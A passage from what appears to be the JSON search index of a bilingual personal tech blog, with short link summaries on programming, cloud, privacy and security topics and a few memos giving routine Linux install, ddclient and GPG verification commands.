that embraced the cloud, and in particular AWS. This two-part blog post is an attempt to share that experience with you. Hope you enjoy! Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/10/10-lessons-from-10-years-of-aws-part-1/","loc":"https://karpoke.ignaciocano.com/2018/01/10/10-lessons-from-10-years-of-aws-part-1/"},{"title":"10 películas para adentrarse en el mundo del anime","text":"Es hablar de anime y a mucha gente le salen sarpullidos. Son muchos los que reniegan de todo un universo sin haberse adentrado nunca él. Un universo lleno de mil mundos distintos en el que puedes encontrar amor, aventura, ciencia ficción, acción, drama, terror, comedia, fantasía… Un universo reinado por Studio Ghibli y su primer espada Hayao Miyazaki. Un universo sin límites que cada año nos sorprende con auténticas joyas. C'mon! Murcia | cmonmurcia.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/05/10-peliculas-para-adentrarse-en-el-mundo-del-anime/","loc":"https://karpoke.ignaciocano.com/2018/01/05/10-peliculas-para-adentrarse-en-el-mundo-del-anime/"},{"title":"10 libros de seguridad informática para regalar estas navidades","text":"Llegan las navidades, aunque comercialmente ya empezaron hace casi un mes, y que mejor que dar ideas para regalar o ser regalado. ¿No sabes que encargarle a los reyes magos? No te preocupes, vamos a comentar los 10 libros de seguridad informática que más leemos en Hispasec. Esos que yacen desgastados en los escritorios de auditoría, malware o el equipo 24x7 de Antifraude, nuestros incansables vigilantes. Leer y hacer son dos palabras claves en la construcción de un buen profesional, sea de la rama que sea. La formación es importante y una de las cosas que siempre ha estado presente en Hispasec es que el personal no le falte lectura, alimento para el cerebro. una-al-dia Hispasec | unaaldia.hispasec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/12/22/10-libros-de-seguridad-informatica-para-regalar-estas-navidades/","loc":"https://karpoke.ignaciocano.com/2017/12/22/10-libros-de-seguridad-informatica-para-regalar-estas-navidades/"},{"title":"10 Best Hacking Movies You Need To Watch In 2018","text":"In this age of smartphones and computers, the electronic devices have become our true companions. For technology enthusiasts and geeks, this is even truer. However, there are only a handful of movies that showcase the geek and hacker culture in a true sense. In this article, I've tried to compile my favorite and best hacking movies that you shouldn't miss. Fossbytes | fossbytes.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/12/10/10-best-hacking-movies-you-need-to-watch-in-2018/","loc":"https://karpoke.ignaciocano.com/2017/12/10/10-best-hacking-movies-you-need-to-watch-in-2018/"},{"title":"10 curiosidades del idioma español","text":"El español es el idioma oficial en más de 20 países del mundo y se calcula que hay alrededor de 490 millones de hispanohablantes en todo el planeta. Una lengua tan extendida por fuerza ha de tener muchas peculiaridades. Te explicamos 10 curiosidades del idioma español que quizá no conocías. 10 curiosidades del idioma español 1. ¿Español o castellano? Supercurioso | supercurioso.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/12/08/10-curiosidades-del-idioma-espanol/","loc":"https://karpoke.ignaciocano.com/2017/12/08/10-curiosidades-del-idioma-espanol/"},{"title":"10 experimentos psicológicos que revelan la verdadera naturaleza humana","text":"La mente humana necesita saber sobre sí misma. Y en más de una ocasión, la búsqueda de ese conocimiento provocó que factores como la ética y la moral caigan a un plano inferior. En las últimas décadas se han desarrollado diferentes experimentos que de ser reproducidos en la actualidad encenderían más de una alarma, y hoy queremos repasar varios de ellos. Si bien no todos son considerados «malos» NeoTeo | neoteo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/12/06/10-experimentos-psicologicos-que-revelan-la-verdadera-naturaleza-humana/","loc":"https://karpoke.ignaciocano.com/2017/12/06/10-experimentos-psicologicos-que-revelan-la-verdadera-naturaleza-humana/"},{"title":"10 File Globbing examples in Linux/Unix","text":"What is file globbing in Linux? File globbing is a feature provided by the UNIX/Linux shell to represent multiple filenames by using special characters called wildcards with a single file name. http://feeds.feedburner.com/TheLinuxJuggernaut | linuxnix.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/12/02/10-file-globbing-examples-in-linux-unix/","loc":"https://karpoke.ignaciocano.com/2017/12/02/10-file-globbing-examples-in-linux-unix/"},{"title":"4 Ways to Speed Up SSH Connections in Linux","text":"SSH is the most popular and secure method for managing Linux servers remotely. One of the challenges with remote server management is connection speeds, especially when it comes to session creation between the remote and local machines. Tecmint: Linux Howtos, Tutorials & Guides | tecmint.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/11/29/4-ways-to-speed-up-ssh-connections-in-linux/","loc":"https://karpoke.ignaciocano.com/2017/11/29/4-ways-to-speed-up-ssh-connections-in-linux/"},{"title":"10 Free CSS Tooltip Snippets To Save Time On Your Web Projects","text":"Adding a simple tooltip into your page isn't hard. You can find a bunch of free tooltip plugins and JS scripts that can help with this. But pure CSS is another option, and it's quickly becoming the preferred choice for many web designers. If you're looking for CSS tooltips, then this collection should have something for you. Speckyboy Design Magazine | speckyboy.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/11/21/10-free-css-tooltip-snippets-to-save-time-on-your-web-projects/","loc":"https://karpoke.ignaciocano.com/2017/11/21/10-free-css-tooltip-snippets-to-save-time-on-your-web-projects/"},{"title":"10 Best LaTeX Editors For Linux","text":"Once you get over the learning curve, there is nothing like LaTex. Here are the best LaTex editors for Linux and other systems. What is LaTeX? LaTeX is a document preparation system. Unlike plain text editor, you can't just write a plain text using LaTeX editors. Here, you will have to utilize LaTeX commands in order to manage the content of the document. It's FOSS | itsfoss.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/11/20/10-best-latex-editors-for-linux/","loc":"https://karpoke.ignaciocano.com/2017/11/20/10-best-latex-editors-for-linux/"},{"title":"Coding with clarity","text":"Working code isn't necessarily good code. Your code also needs to be easy to read, understand, and modify. It needs clarity, and to achieve that, it has to be organized well, with careful planning and proper separation of ideas taking place before you even open your code editor. Coding for clarity is something that separates the great developers from the merely good, and there are a few basic principles that can set you on that path. » Brandon Gregory | alisapart.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/10/28/coding-with-clarity/","loc":"https://karpoke.ignaciocano.com/2017/10/28/coding-with-clarity/"},{"title":"Así funcionaba el primer gran sistema que evitaba que hicieras copias de VHS","text":"ya en la década de los 80 había tecnologías anticopia en las películas. Una de las más populares fue Macrovision, que protegía los VHS haciendo que cuando se creasen copias estas fueran defectuosas. El sistema estuvo vigente durante varios años, e incluso acabó dando el salto al DVD. » Yúbal FM | xataka.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/10/22/asi-funcionaba-el-primer-gran-sistema-que-evitaba-que-hicieras-copias-de-vhs/","loc":"https://karpoke.ignaciocano.com/2017/10/22/asi-funcionaba-el-primer-gran-sistema-que-evitaba-que-hicieras-copias-de-vhs/"},{"title":"Moving persistent data out of Redis","text":"Transitioning all that information transparently involved planning and coordination. For each problem domain using persistent Redis, we considered the volume of operations, the structure of the data, and the different access patterns to predict the impact on our current MySQL capacity, and the need for provisioning new hardware. For the majority of callsites, we replaced persistent Redis with GitHub::KV, a MySQL key/value store of our own built atop InnoDB, with features like key expiration. We were able to use GitHub::KV almost identically as we used Redis: from trending repositories and users for the explore page, to rate limiting to spammy user detection. » Bryana Knight and Miguel Fernández | github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2017/01/14/moving-persistent-data-out-of-redis/","loc":"https://karpoke.ignaciocano.com/2017/01/14/moving-persistent-data-out-of-redis/"},{"title":"Instalar Spotify en Ubuntu 16.04","text":"Si queremos instalar el cliente de Spotify en Ubuntu Xenial Xerus, tan sólo tenemos que instalar la clave: bash $ sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys BBEBDCB318AD50EC6865090613B00F1FD2C19886 Executing: /tmp/tmp.imoQkQ9ZVV/gpg.1.sh --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys BBEBDCB318AD50EC6865090613B00F1FD2C19886 gpg: solicitando clave D2C19886 de hkp servidor keyserver.ubuntu.com gpg: clave D2C19886: clave pública \"Spotify Public Repository Signing Key <operations@spotify.com>\" importada gpg: Cantidad total procesada: 1 gpg: importadas: 1 (RSA: 1) Añadimos el PPA oficial: bash $ echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list Actualizamos e instalamos: ```bash $ sudo apt update sudo apt install spotify-client ``` Referencias » spotify.com","tags":"memo","url":"https://karpoke.ignaciocano.com/2016/12/15/instalar-spotify-en-ubuntu-16-04/","loc":"https://karpoke.ignaciocano.com/2016/12/15/instalar-spotify-en-ubuntu-16-04/"},{"title":"Instalar Postgresql 9.6 en Ubuntu 16.04","text":"La versión de Postgresql que viene en los repositorios de Ubuntu Xenial Xerus es la 9.5. Si queremos instalar la 9.6, podemos recurrrir al PPA oficial. Importamos la clave: bash $ wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add - Añadimos el PPA: bash $ echo \"deb http://apt.postgresql.org/pub/repos/apt/ xenial-pgdg main\" | sudo tee /etc/apt/sources.list.d/postgresql.list Actualizamos e instalamos: bash $ sudo apt update $ sudo apt install postgresql-9.6 postgresql-contrib Referencias » linoxide.com","tags":"memo","url":"https://karpoke.ignaciocano.com/2016/12/13/instalar-postgresql-9-6-en-ubuntu-16-04/","loc":"https://karpoke.ignaciocano.com/2016/12/13/instalar-postgresql-9-6-en-ubuntu-16-04/"},{"title":"Never write for-loops again","text":"It's been a while since I started exploring the amazing language features in Python. At the beginning, it's just a challenge I gave myself to practice using more language features instead of those I learned from other programming language. And things are just getting more fun! Not only the code become shorter and cleaner, but also code looks more structured and disciplined. I'll get into those benefits more in this article. » Randy Daw-Ran Liou | medium.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/12/never-write-for-loops-again/","loc":"https://karpoke.ignaciocano.com/2016/12/12/never-write-for-loops-again/"},{"title":"Tor at the heart: bridges and pluggable transports","text":"Censors block Tor in two ways: they can block connections to the IP addresses of known Tor relays, and they can analyze network traffic to find use of the Tor protocol. Bridges are secret Tor relays—they don't appear in any public list, so the censor doesn't know which addresses to block. Pluggable transports disguise the Tor protocol by making it look like something else—for example like HTTP or completely random. There are several pluggable transports, and it can be hard to know which one to use. If it is your first time, try obfs4: it is a randomizing transport that works for most people. If obfs4 doesn't work, try fte. If that doesn't work, it may mean that the default bridges are blocked, and you should get a custom bridge from bridges.torproject.org. If the custom bridge doesn't work, try meek-azure or meek-amazon. » ssteele | torproject.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/11/tor-at-the-heart-bridges-and-pluggable-transports/","loc":"https://karpoke.ignaciocano.com/2016/12/11/tor-at-the-heart-bridges-and-pluggable-transports/"},{"title":"Qué son los cypherpunks y por qué son tan importanes en la lucha por la privacidad","text":"Los punkis trajeron cambios a nivel estético: crestas de colores, tatuajes, botas militares, cazadoras de cuero, escarceos con las drogas y música que el grupo vasco Eskorbuto definiría en su momento como \"antitodo\". En resumidas cuentas, a partir de 1977 el punk se convirtió en anarquía de la estética. Y cuando se añadieron ordenadores y redes a la mezcla para los años 90 del siglo pasado, entonces aparecieron los cyberpunks. Sergio Agudo | genbeta.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/11/que-son-los-cypherpunks-y-por-que-son-tan-importanes-en-la-lucha-por-la-privacidad/","loc":"https://karpoke.ignaciocano.com/2016/12/11/que-son-los-cypherpunks-y-por-que-son-tan-importanes-en-la-lucha-por-la-privacidad/"},{"title":"Cómo montar una mini consola con Raspberry Pi","text":"En el siguiente artículo vamos a ver, paso a paso, como montar una mini consola similar a la Mini NES Classic, pero a nuestro gusto, con la posibilidad de emular una larga lista de consolas, utilizando una Raspberry Pi, un ordenador de bajo consumo y bajo coste, y gran cantidad de software libre, por un precio de unos 70 euros como mínimo. Las características más interesantes de nuestra Raspberry Pi (aunque no las únicas) serán las siguientes: Emular juegos de múltiples consolas: NES, SNES, Gameboy, MegaDrive, PSX, PSP, N64... Emular juegos «retro» de PC/MSDOS: DOSBox, ScummVM, ResidualVM, etc. Utilizarla de Media Center para reproducir películas, series, música, emisoras de radio... Actualizable con capacidad de añadir futuras mejoras (e incluso overclockeable). Basado en GNU/Linux, por lo que puede usarse a modo de servidor, PC o sistema ligero. Posibilidad de jugar online con otros jugadores de Raspberry Pi (o emuladores en PC). Mecanismo de «retrologros» similar a los utilizados en Steam. Posibilidad de cargar shaders o filtros para emular efectos visuales o pantallas CRT. Posibilidad de instalar ports de juegos de otras plataformas trasladadas a RPi. Hay una buena colleción de ROMs en nicoblog.org . Manz | emezeta.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/07/como-montar-una-mini-consola-con-raspberry-pi/","loc":"https://karpoke.ignaciocano.com/2016/12/07/como-montar-una-mini-consola-con-raspberry-pi/"},{"title":"Undebt: how we refactored 3 million lines of code","text":"Peter Seibel wrote that to maximize engineering effectiveness, \"Let a thousand flowers bloom. Then rip 999 of them out by the roots.\" Flowers, in how the metaphor applies to us, are code patterns — the myriad different functions, classes, styles, and idioms that developers use when writing code. At first, new flowers are welcome — maybe the new pattern seems easier to use, more scalable, more efficient, or more suited to some particular task than the old. As a code base grows, and the flowers proliferate, however, it becomes clear which patterns work and which don't. Suddenly, code patterns that were once beautiful new flowers become technical debt in need of removal. When that happens, it's time to start ripping. Otherwise, since developers learn by reading (and occasionally copy-and-pasting) from existing code, the bad flowers and the technical debt that comes with them will continue to grow unchecked. Evan H. | engineeringblog.yelp.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/07/undebt-how-we-refactored-3-million-lines-of-code/","loc":"https://karpoke.ignaciocano.com/2016/12/07/undebt-how-we-refactored-3-million-lines-of-code/"},{"title":"Se vende censor de desnudos: de compras por un mercadillo de algoritmos","text":"Hay un bazar en internet que se dedica a la compraventa de inteligencia artificial, esa que algunos temen por si se nos va de las manos. En los puestos de Algorithmia, este supermercado del siglo XXI, los desarrolladores web pueden añadir a su carrito virtual un fragmento de código capaz de reconocer formas y colores o analizar sentimientos pese a no comprenderlos. algorithmia.com Cristina Sánchez | yorokobu.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/07/se-vende-censor-de-desnudos-de-compras-por-un-mercadillo-de-algoritmos/","loc":"https://karpoke.ignaciocano.com/2016/12/07/se-vende-censor-de-desnudos-de-compras-por-un-mercadillo-de-algoritmos/"},{"title":"How to teach endian","text":"One of the major disciplines in computer science is parsing/formatting. This is the process of converting the external format of data (file formats, network protocols, hardware registers) into the internal format (the data structures that software operates on). It should be a formal computer-science discipline, because it's actually a lot more difficult than you'd expect. That's because the majority of vulnerabilities in software that hackers exploit are due to parsing bugs. Since programmers don't learn about parsing formally, they figure it out for themselves, creating ad hoc solutions that are prone to bugs. For example, programmers assume external buffers cannot be larger than internal ones, leading to buffer overflows. Robert Graham | erratasec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/12/07/how-to-teach-endian/","loc":"https://karpoke.ignaciocano.com/2016/12/07/how-to-teach-endian/"},{"title":"Actualizar nuestra IP en el panel de OpenDNS","text":"Si estamos usando el servicio OpenDNS Home y tenemos una IP dinámica, podemos utilizar ddclient , disponible en los repositorios, para actualizar la IP registrada en dicho servicio cada vez que cambie nuestra IP . Para ello, lo único que necesitamos es editar el fichero de configuración en /etc/ddclient.conf : ```bash OpenDNS.com account-configuration use=web, web=myip.dnsomatic.com ssl=yes server=updates.opendns.com protocol=dyndns2 login=username@example.com password=opendns_password opendns_network_label ``` Los espacios en el nombre dado a la red se deben sustituir por guiones bajos \"_\" y si la contraseña contiene caracteres especiales, se debe encerrar entre comillas simples \"'\". Si lo acabamos de instalar y seguimos el asistente, el archivo resultante no será exactamente igual: Proveedor de servicio: updates.opendns.com Protocolo: dyndns2 Nombre de usuario: username@example.com Contraseña: opendns_password Interfaz de red: eth0 Nombres completos de dominios: opendns_network_label Esto genera el siguiente archivo de configuración: bash protocol=dyndns2 use=if, if=eth0 server=updates.opendns.com login=username@example.com password=opendns_password opendns_network_label Para especificar que la IP la coja de un servicio externo en lugar de una interfaz de red, tendremos que cambiar: bash use=if, if=eth0 por: bash use=web, web=myip.dnsomatic.com y añadimos que use ssl : bash ssl=yes Probamos la configuración: bash sudo ddclient -daemon=0 -debug -verbose -noquiet Para que se ejecute al inicio: bash sudo /sbin/chkconfig ddclient on Para lanzarlo: bash sudo /sbin/service ddclient start","tags":"admin","url":"https://karpoke.ignaciocano.com/2016/12/03/actualizar-nuestra-ip-en-el-panel-de-opendns/","loc":"https://karpoke.ignaciocano.com/2016/12/03/actualizar-nuestra-ip-en-el-panel-de-opendns/"},{"title":"Writing efficient JavaScript","text":"This entry describes simple techniques to fulfill the JavaScript compiler optimization process which results in faster running code. Especially in games you immediately notice frame drops and when the garbage collector has to hit in with a big stack of work to do. Felix Maier | medium.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/30/writing-efficient-javascript/","loc":"https://karpoke.ignaciocano.com/2016/11/30/writing-efficient-javascript/"},{"title":"Descargar archivos de zippyshare desde el terminal con plowshare","text":"plowshare es una herramienta diseñada para descargar y subir ficheros a los sitios de intercambio de ficheros más populares. Hace ya un tiempo la podíamos usar para descargar archivos de Megaupload . Instalación Primero, instalamos las dependencias: bash $ sudo aptitude install curl recode imagemagick tesseract-ocr-eng spidermonkey-bin rhino perlmagick aview Podemos descargar el código fuente desde el repositorio Git y compilarlo: bash $ git clone https://github.com/mcrapet/plowshare.git $ cd plowshare Podemos instalarlo mediante sudo make install , o si no tenemos privilegios de root, podemos sobreescribir el prefijo /usr con make install prefix=$home/local . También podemos crear un paquete .deb : bash $ sudo checkinstall Instalamos los módulos externos mediante la herramienta para gestionar dichos módulos: bash $ plowmod --install Más adelante podremos actualizarlos ejecutando: bash $ plowmod --update Descargando Para descargar un enlace de zippyshare, por ejemplo, escribimos: bash $ plowdown http://www43.zippyshare.com/v/laVpgPTS/file.html También podemos pasarle un fichero que contenga los enlaces: bash $ plowdown links.txt Si queremos que modifique el fichero para que comente los enlaces que se han descargado correctamente, no tenemos más que pasarle el argumento -m .","tags":"admin","url":"https://karpoke.ignaciocano.com/2016/11/26/descargar-archivos-de-zippyshare-desde-el-terminal-con-plowshare/","loc":"https://karpoke.ignaciocano.com/2016/11/26/descargar-archivos-de-zippyshare-desde-el-terminal-con-plowshare/"},{"title":"Comprobar la firma de Xposed","text":"Ayer mismo, se subió una nueva versión del framework Xposed , el cual tengo instalado en un Samsung S4. Si queremos descargarla y comprobar mediante la firma que lo que nos hemos bajado no ha sido alterado, no tenemos más que hacer uso de gpg . Descargamos los archivos: bash $ wget http://dl-xda.xposed.info/framework/sdk23/arm/xposed-v87-sdk23-arm.zip $ wget http://dl-xda.xposed.info/framework/sdk23/arm/xposed-v87-sdk23-arm.zip.asc Y comprobamos la firma: bash $ gpg --verify xposed-v87-sdk23-arm.zip.asc gpg: Signature made jue 24 nov 2016 22:26:15 CET using RSA key ID 852109AA gpg: Can't check signature: public key not found En este caso, la firma no está certificada por una autoridad de confianza, y tampoco la tenemos importada en nuestro sistema. Vamos a buscarla y, si nos fiamos de esa cuenta de correo, tenemos la opción de importarla: bash $ gpg --search-keys 852109AA gpg: searching for \"852109AA\" from hkp server keys.gnupg.net (1) rovo89 <android@robv.de> rovo89 <rovo89@xposed.info> 4096 bit RSA key 7235F333, created: 2016-03-12 Keys 1-1 of 1 for \"852109AA\". Enter number(s), N)ext, or Q)uit > 1 gpg: requesting key 7235F333 from hkp server keys.gnupg.net gpg: key 7235F333: public key \"rovo89 <android@robv.de>\" imported gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model gpg: depth: 0 valid: 1 signed: 0 trust: 0-, 0q, 0n, 0m, 0f, 1u gpg: Total number processed: 1 gpg: imported: 1 (RSA: 1) Ahora ya podemos verificar el fichero descargado: bash $ gpg --verify xposed-v87-sdk23-arm.zip.asc gpg: Signature made jue 24 nov 2016 22:26:15 CET using RSA key ID 852109AA gpg: Good signature from \"rovo89 <android@robv.de>\" gpg: aka \"rovo89 <rovo89@xposed.info>\" gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 0DC8 2B3E B1C4 6D48 33B4 C434 E82F 0871 7235 F333 Subkey fingerprint: EA94 3952 EB4E 66EB 8115 1B3E 865B 714E 8521 09AA","tags":"memo","url":"https://karpoke.ignaciocano.com/2016/11/25/comprobar-la-firma-de-xposed/","loc":"https://karpoke.ignaciocano.com/2016/11/25/comprobar-la-firma-de-xposed/"},{"title":"Hype Driven Development","text":"Software development teams often make decisions about software architecture or technological stack based on inaccurate opinions, social media, and in general on what is considered to be \"hot\", rather than solid research and any serious consideration of expected impact on their projects. I call this trend Hype Driven Development, perceive it harmful and advocate for a more professional approach I call \"Solid Software Engineering\". Learn more about how it works and find out what you can do instead. Marek Kirejczyk | blog.daftcode.pl","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/25/hype-driven-development/","loc":"https://karpoke.ignaciocano.com/2016/11/25/hype-driven-development/"},{"title":"Hasta el infinito y más allá. Bienvenido IPv6 (I)","text":"El principal motivo de la creación de IPv6 fue la falta de direcciones IPv4 por la expansión de países altamente poblados como China e India. La principal y más conocida ventaja es el tamaño de su rango de direcciones. Como todo el mundo sabe, una dirección IPv4 consta de 32 bits, lo cual posibilita un direccionamiento de 2&#94;32 máquinas (4.294.967.296). En cambio, una dirección IPv6 está formada por 128 bits, dando lugar a 2&#94;128 direcciones posibles, este número es muy difícil de imaginar, o de manejar, ya que el ser humano no esta acostumbrado a números de tal magnitud. Jesús Largo | securityartwork.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/25/hasta-el-infinito-y-mas-alla-bienvenido-ipv6-i/","loc":"https://karpoke.ignaciocano.com/2016/11/25/hasta-el-infinito-y-mas-alla-bienvenido-ipv6-i/"},{"title":"Bullet proofing Django models","text":"We recently added a bank account like functionality into one of our products. During the development we encountered some textbook problems and I thought it can be a good opportunity to go over some of the patterns we use in our Django models. This article was written in the order in which we usually address new problems: 1. Define the business requirements. 2. Write down a naive implementation and model definition. 3. Challenge the solution. 4. Refine and repeat. Haki Benita | medium.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/07/bullet-proofing-django-models/","loc":"https://karpoke.ignaciocano.com/2016/11/07/bullet-proofing-django-models/"},{"title":"The open guide to Amazon Web Services","text":"A lot of information on AWS is already written. Most people learn AWS by reading a blog or a \"getting started guide\" and referring to the standard AWS references. Nonetheless, trustworthy and practical information and recommendations aren't easy to come by. AWS's own documentation is a great but sprawling resource few have time to read fully, and it doesn't include anything but official facts, so omits experiences of engineers. The information in blogs or Stack Overflow is also not consistently up to date. This guide is by and for engineers who use AWS. It aims to be a useful, living reference that consolidates links, tips, gotchas, and best practices. It arose from discussion and editing over beers by several engineers who have used AWS extensively. » github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/07/the-open-guide-to-amazon-web-services/","loc":"https://karpoke.ignaciocano.com/2016/11/07/the-open-guide-to-amazon-web-services/"},{"title":"Streisand: Una herramienta que permite evadir la censura de Gobiernos y ISP de forma fácil","text":"Cuando los Gobiernos y proveedores de Internet bloquean un portal, nos tenemos que buscar la vida cambiando los DNS, conectándonos a servidores Proxy y VPN e incluso a la red Tor. Streisand es una herramienta gratuita que nos permite automatizar el proceso de configuración de nuevos servidores VPN, Proxy y Tor para proporcionar a los usuarios una solución rápida y fácil, ideal para activistas en Internet. Ver el proyecto en github.com . Sergio De Luz | redeszone.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/06/streisand-una-herramienta-que-permite-evadir-la-censura-de-gobiernos-y-isp-de-forma-facil/","loc":"https://karpoke.ignaciocano.com/2016/11/06/streisand-una-herramienta-que-permite-evadir-la-censura-de-gobiernos-y-isp-de-forma-facil/"},{"title":"Linux containers in 500 lines of code","text":"I've used Linux containers directly and indirectly for years, but I wanted to become more familiar with them. So I wrote some code. This used to be 500 lines of code, I swear, but I've revised it some since publishing; I've ended up with about 70 lines more. I wanted specifically to find a minimal set of restrictions to run untrusted code. This isn't how you should approach containers on anything with any exposure: you should restrict everything you can. But I think it's important to know which permissions are categorically unsafe! Lizzie Dixon | blog.lizzie.io","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/01/linux-containers-in-500-lines-of-code/","loc":"https://karpoke.ignaciocano.com/2016/11/01/linux-containers-in-500-lines-of-code/"},{"title":"8 simple rules for a robust, scalable CSS architecture","text":"This is the manifest of things I've learned about managing CSS in large, complex web projects during my many years of professional web development. I've been asked about these things enough times that having a document to point to sounded like a good idea. I've tried to keep the explanations short, but this is essentially the tl;dr: Always prefer classes Co-locate component code Use consistent class namespacing Maintain a strict mapping between namespaces and filenames Prevent leaking styles outside the component Prevent leaking styles inside the component Respect component boundaries Integrate external styles loosely Jarno Rantanen | github.com | via css-tricks.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/11/01/8-simple-rules-for-a-robust-scalable-css-architecture/","loc":"https://karpoke.ignaciocano.com/2016/11/01/8-simple-rules-for-a-robust-scalable-css-architecture/"},{"title":"The design of CockroachDB","text":"CockroachDB is a distributed SQL database. The primary design goals are scalability, strong consistency and survivability (hence the name). CockroachDB aims to tolerate disk, machine, rack, and even datacenter failures with minimal latency disruption and no manual intervention. CockroachDB nodes are symmetric; a design goal is homogeneous deployment (one binary) with minimal configuration and no required external dependencies. Spencer Kimball | github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/10/02/the-design-of-cockroachdb/","loc":"https://karpoke.ignaciocano.com/2016/10/02/the-design-of-cockroachdb/"},{"title":"Improve your photographic composition by following these guidelines","text":"First of all we have to define what is meant by ‘composition'. Composition refers to the way the various elements in a scene are arranged within the frame. As I've already mentioned, these are not hard and fast rules but guidelines. That said, many of them have been used in art for thousands of years and they really do help achieve more attractive compositions. I find that I usually have one or more of these guidelines in the back of my mind as I'm setting up a shot. Barry O Carroll | bocphotography.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/29/improve-your-photographic-composition-by-following-these-guidelines/","loc":"https://karpoke.ignaciocano.com/2016/09/29/improve-your-photographic-composition-by-following-these-guidelines/"},{"title":"The basics of web application security","text":"Somewhere, way down at the bottom of the list of requirements, behind, fast, cheap, and flexible is \"secure\". That is, until something goes wrong, until the system you build is compromised, then suddenly security is, and always was, the most important thing. Security is a cross-functional concern a bit like Performance. And a bit unlike Performance. Like Performance, our business owners often know they need Security, but aren't always sure how to quantify it. Unlike Performance, they often don't know \"secure enough\" when they see it. So how can a developer work in a world of vague security requirements and unknown threats? Advocating for defining those requirements and identifying those threats is a worthy exercise, but one that takes time and therefore money. Much of the time developers will operate in absence of specific security requirements and while their organization grapples with finding ways to introduce security concerns into the requirements intake processes, they will still build systems and write code. Cade Cairns and Daniel Somerfield | martinfowler.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/25/the-basics-of-web-application-security/","loc":"https://karpoke.ignaciocano.com/2016/09/25/the-basics-of-web-application-security/"},{"title":"Por qué no utilizo métricas","text":"Al principio me molestaba en calcular métricas sobre el código fuente (utilizaba cosas como Source Monitor para ello), que me indicaran número de líneas de código, complejidad ciclomática, nivel máximo de anidamiento, profundidad de jerarquías…., en fin todo tipo de datos para disfrutar con un poco de porno de estadísticas. Además, analizaba la cobertura de código que alcanzaban mis tests (con NCover, si no recuerdo mal), y tenía configurados mis avisos si no llegaban a determinados niveles. Nunca les hice excesivo caso, pero era bonito tenerlas y consultarlas de vez en cuando, e incluso a veces me servían para ver áreas que podía mejorar refactorizando el código o añadiendo más tests. Hoy en día no uso este tipo de indicadores y no los echo en absoluto de menos, pero antes de ver por qué yo no consigo sacarles mucho partido, vamos a ver qué razonamientos hay detrás del uso de métricas y por qué, a lo mejor a ti, sí que te resultan útiles. Juan María Hernández | blog.koalite.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/25/por-que-no-utilizo-metricas/","loc":"https://karpoke.ignaciocano.com/2016/09/25/por-que-no-utilizo-metricas/"},{"title":"A nerd's guide to color on the web","text":"There are a lot of ways to work with color on the web. I think it's helpful to understand the mechanics behind what you're using, and color is no exception. Let's delve into some of the technical details of color on the web. Sarah Drasner | css-tricks.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/25/a-nerds-guide-to-color-on-the-web/","loc":"https://karpoke.ignaciocano.com/2016/09/25/a-nerds-guide-to-color-on-the-web/"},{"title":"Music theory for nerds","text":"I don't know anything about music. I know there are letters but sometimes the letters have squiggles; I know an octave doubles in pitch; I know you can write a pop song with only four chords. That's about it. The rest has always seemed completely, utterly arbitrary. Why do we have twelve notes, but represent them with only seven letters? Where did the key signatures come from? Why is every Wikipedia article on this impossible to read without first having read all the others? A few days ago, some of it finally clicked. I feel like an idiot for not getting it earlier, but I suppose it doesn't help that everyone explains music using, well, musical notation, which doesn't make any sense if you don't know why it's like that in the first place. Lexy Munroe | eev.ee","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/25/music-theory-for-nerds/","loc":"https://karpoke.ignaciocano.com/2016/09/25/music-theory-for-nerds/"},{"title":"Fixing E.T. The Extra-Terrestrial for the Atari 2600","text":"If you're reading this page, chances are that you're already well aware that E.T. for the Atari 2600 is one of the most reviled games ever made. I never understood why. As a child, it was one of my favorite games. I still think it's a good game. Apparently, I'm not alone. On this page I'm going to briefly explore why people hate E.T., and how the game can be fixed. » necomputer.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/24/fixing-e-t-the-extra-terrestrial-for-the-atari-2600/","loc":"https://karpoke.ignaciocano.com/2016/09/24/fixing-e-t-the-extra-terrestrial-for-the-atari-2600/"},{"title":"How Dropbox securely stores your passwords","text":"It's universally acknowledged that it's a bad idea to store plain-text passwords. If a database containing plain-text passwords is compromised, user accounts are in immediate 